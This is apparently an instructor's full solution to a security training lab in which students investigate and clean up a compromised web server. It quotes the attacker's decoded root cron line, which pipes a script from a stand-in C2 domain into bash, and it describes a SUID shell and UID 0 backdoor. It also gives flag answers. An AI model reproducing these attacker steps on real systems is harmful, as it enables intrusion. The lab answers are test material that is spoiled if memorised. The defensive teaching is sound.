# Security+ Blue Team Lab 01: Web server incident (INC-5203): instructor walkthrough

> **Spoiler warning.** This is the full solution. Students should not read it before the lab.

Student URL: `http(s)://<lab-host>:<port>/dashboard`. Instructor view: `/dashboard/admin`. See [README.md](README.md) for setup.

## The scenario

CorpNet's public web server WEB-01 (10.20.0.10) is beaconing to the internet. The student is the incident responder, logged in to WEB-01 with sudo. Every student gets their own copy of the server and network. The values in angle brackets below are unique per student:

| Value | Example | Where students find it |
|---|---|---|
| Attacker IP | `198.51.100.65` | `/var/log/auth.log`, `/var/log/nginx/access.log` |
| Compromised account | `deploy`, `webdeploy`, `cicd` or `webops` | `/var/log/auth.log` |
| Attacker server (C2) IP | `203.0.113.229` | `tcpdump`, `getent hosts <domain>` |
| C2 domain | `cdn-sync-update.net` | the beacon script, `tcpdump`, `/root/.bash_history` |

## What the attacker did

| Step | Attacker action | Evidence on WEB-01 |
|---|---|---|
| Reconnaissance | Nmap and gobuster against the website | `access.log`: 404s for `/.env`, `/.git/config`, `/wp-login.php` from the attacker IP |
| Initial access | SSH password brute force against the CI account (130 to 170 failures, then success) | `auth.log`: `Failed password` then `Accepted password` from the attacker IP |
| Privilege escalation | The CI account owns `/usr/local/bin/web-healthcheck.sh`, which root runs from cron and which the account may run with `sudo`. The attacker appended a line that makes a SUID copy of bash, ran it with sudo, and got a root shell. | `~<account>/.bash_history`, `sudo` line in `auth.log`, `/usr/local/lib/.cache/.dbus-helper` (SUID root) |
| Persistence | UID 0 account `sysupdate`, attacker SSH key in root's and the CI account's `authorized_keys`, cron job `/etc/cron.d/dbus-sync` | `/etc/passwd`, `useradd` line in `auth.log`, `/etc/cron.d`, `authorized_keys` |
| Command and control | Bash loop disguised as `[kworker/u4:1-events]` POSTs to the C2 every 20 s | `ps auxf`, `tcpdump` |
| Reinfection | A base64 line added to `web-healthcheck.sh` downloads `/static/u.sh` from the C2 every 2 minutes, as root, and reinstalls the beacon, cron job, UID 0 account and SSH key | `sha256sum -c /opt/ir/baseline.sha256` |

## Topology

```
 DMZ 10.20.0.0/24                                  "Internet" 203.0.113.0/24
 WEB-01   10.20.0.10  (student)  --+               +-- C2 server <C2 IP>
 DNS01    10.20.0.53             --+--[SW]--FW-01--+
 MON-01   10.20.0.100 (monitor)  --+      .1    .1
```

`/opt/ir/README.txt` on WEB-01 lists what should exist: accounts, the approved SSH key, scheduled jobs, and the known-good baselines.

| Stage | Points | Scored by | Concept |
|---|---|---|---|
| 1. Detect: find the beacon | 100 | Flag `SECP{beacon_in_the_noise_xxxxxx}` | Processes, connections, packet capture |
| 2. Analyze: how did they get in? | 200 | Flag `SECP{<attacker IP>_<account>}` | Log analysis, brute-force indicators |
| 3. Contain and eradicate | 300 | 6 live checks | Host firewall, persistence |
| 4. Recover: close the way back in | 400 | 5 live checks | Integrity baselines, least privilege, credentials |

## Stage 1: Detect (100 pts)

1. Look at the processes:
   ```
   ps auxf
   ```
   ```
   root  101  /usr/bin/flock -n /var/tmp/.font-unix/.lock /bin/bash -c exec -a "[kworker/u4:1-events]" /bin/bash /var/tmp/.font-unix/dbus-sync
   root  102   \_ [kworker/u4:1-events] /var/tmp/.font-unix/dbus-sync
   root  136       \_ sleep 20
   ```
   Kernel threads never show up inside a container, and a real one has no script path. A hidden directory (`.font-unix`) under `/var/tmp` is another red flag.
2. Watch its traffic, leaving out the monitor's requests:
   ```
   sudo tcpdump -i eth0 -n -A 'tcp dst port 80 and not host 10.20.0.100'
   ```
   Every 20 seconds there is a DNS lookup for the C2 domain and a `POST /api/v2/beacon` to the C2 IP with the header `X-Session: SECP{beacon_in_the_noise_...}`. That is **flag 1**.
3. Other ways to the same flag: `sudo cat /var/tmp/.font-unix/dbus-sync`, or `ps auxf` at the moment `curl` runs (its command line includes the header).

Teaching point: detection starts with "what is normal here?". Disguised process names, hidden directories in world-writable paths, and regular outbound connections at a fixed interval are classic indicators of compromise.

## Stage 2: Analyze (200 pts)

1. Count failed SSH logins per source:
   ```
   grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
   ```
   ```
       134 198.51.100.65    <- attacker
        21 192.0.2.184      <- internet scanner, never got in
         1 10.20.0.15       <- staff admin PC, one typo
   ```
2. Find the successful logins:
   ```
   grep 'Accepted' /var/log/auth.log
   ```
   Besides the CI server's key logins (10.20.0.5) and the admin PC (10.20.0.15), there is `Accepted password for <account> from <attacker IP>` right after the failures, and later `Accepted password for sysupdate from <attacker IP>`.
3. Submit **flag 2** as `SECP{<attacker IP>_<account>}`, for example `SECP{198.51.100.65_deploy}`.
4. Scope what happened next (needed for stages 3 and 4):
   ```
   grep -E 'sudo|useradd|chpasswd|sysupdate' /var/log/auth.log
   sudo cat /home/<account>/.bash_history /root/.bash_history
   ```
   The account history shows the privilege escalation through `web-healthcheck.sh` and the SUID shell. Root's history shows the dropper being downloaded from the C2.

Teaching point: one brute-force source among normal noise. The scanner shows that failed logins alone are not an incident; a success after many failures is.

## Stage 3: Contain and eradicate (300 pts)

The checklist: C2 unreachable, beacon not running, beacon file gone, cron job gone, UID 0 account gone, attacker key gone.

1. **Contain first.** Block the C2 IP at the host firewall:
   ```
   getent hosts <C2 domain>
   sudo iptables -A OUTPUT -d <C2 IP> -j DROP
   ```
2. Stop and remove the beacon and its cron job:
   ```
   sudo pkill -f dbus-sync
   sudo rm -rf /var/tmp/.font-unix
   sudo rm /etc/cron.d/dbus-sync
   ```
3. Remove the backdoor account:
   ```
   awk -F: '$3 == 0' /etc/passwd
   sudo userdel -f sysupdate
   ```
   Plain `userdel` refuses ("user sysupdate is currently used by process 1") because UID 0 is in use; `-f` forces it. **Never use `userdel -r` here**: the account's home is `/root`.
4. Remove the attacker's key (comment `backup@corp-nas`) from both files. `/opt/ir/README.txt` says only `ci@build-01` is approved:
   ```
   sudo sed -i '/backup@corp-nas/d' /root/.ssh/authorized_keys /home/<account>/.ssh/authorized_keys
   ```
5. Click **Check my work**. All six items pass.

What goes wrong if students skip step 1: within 2 minutes the cron job, beacon, UID 0 account and SSH key are all back, because the tampered `web-healthcheck.sh` reinstalls them from the C2 as root. The checklist shows items flipping back to failed. This is the lesson: contain before you eradicate, or the attacker undoes your work. Blocking the C2 stops the reinfection even before stage 4 is fixed.

Other mistakes to watch for:

- `sudo iptables -P INPUT DROP` or `-P OUTPUT DROP` without allow rules cuts off the student's own terminal and the website. **Reset lab** fixes it.
- Blocking only the domain in `/etc/hosts` does not pass the check. The check tests the C2 IP itself, as a firewall rule would.
- Killing only the `flock` parent leaves the beacon running; killing only the beacon lets cron restart it a minute later.

## Stage 4: Recover (400 pts)

The checklist: script restored, script only writable by root, SUID shell gone, compromised account's password reset, website up.

1. Integrity check against the golden image:
   ```
   sudo sha256sum -c /opt/ir/baseline.sha256 | grep -v ': OK$'
   ```
   ```
   /usr/local/bin/web-healthcheck.sh: FAILED
   ```
2. Read the change and decode it:
   ```
   tail -3 /usr/local/bin/web-healthcheck.sh
   echo '<base64 text>' | base64 -d
   ```
   It is `curl -fsS -m 8 http://<C2 domain>/static/u.sh | bash`, run as root every 2 minutes.
3. Restore the known-good copy and fix the weakness (the CI account owned a script that root runs):
   ```
   ls -l /usr/local/bin/web-healthcheck.sh        # owned by <account>
   sudo cp /opt/ir/golden/web-healthcheck.sh /usr/local/bin/web-healthcheck.sh
   sudo chown root:root /usr/local/bin/web-healthcheck.sh
   sudo chmod 755 /usr/local/bin/web-healthcheck.sh
   ```
4. Find and remove the SUID root shell:
   ```
   sudo find / -xdev -perm -4000 -type f 2>/dev/null | sort | diff /opt/ir/suid-baseline.txt -
   sudo rm /usr/local/lib/.cache/.dbus-helper
   ```
5. Reset the compromised account's password, or lock it until the CI team rotates it:
   ```
   sudo passwd <account>        # or: sudo passwd -l <account>
   ```
6. Click **Check my work**. The website check passes as long as nginx is running and MON-01 can reach port 80.

Teaching point: the root cause was not the weak password alone but a privilege boundary: a normal account could change code that root runs. File integrity monitoring found it, least privilege fixes it.

## Discussion questions

1. Map what you did to the CompTIA incident response process: preparation, detection, analysis, containment, eradication, recovery, lessons learned. Which artifacts in `/opt/ir` belong to preparation?
2. Why must containment come before eradication? What did you see if you did it the other way round?
3. Which indicators of compromise would you share with other teams (IPs, domain, file paths, hashes, user names, key fingerprint)?
4. What evidence did you destroy by cleaning up? In a real incident, what would you collect first (memory, disk image, logs) and why does chain of custody matter?
5. Which controls would have stopped this attack at each step: rate limiting or fail2ban, MFA, key-only SSH, least privilege on the script, file integrity monitoring, egress filtering?
6. Would you rebuild WEB-01 from a clean image instead of cleaning it? What are the trade-offs?
7. What goes in the lessons-learned report for INC-5203?

## Instructor notes

- The instructor view shows each student's progress per stage. Stages 3 and 4 count as solved the first time every check passes.
- **Reset lab** rebuilds the server with the same attacker values and keeps solved stages. Use it for students who locked themselves out.
- Labs stop 60 minutes after launch unless the student clicks **Extend** in the last 15 minutes, or you click **+60 min** in the instructor view. Solved stages are kept.
- Checks run against the live server, so a student can see exactly which items are still failing. Checks are rate limited to 8 per minute per student.
- The website must stay up: MON-01 requests it every 30 seconds (visible in `access.log`), and stage 4 tests it.
- `auth.log` and `access.log` are generated at launch with about a day of realistic history. Live SSH logins by students do not appear in `auth.log` (the container has no syslog daemon).
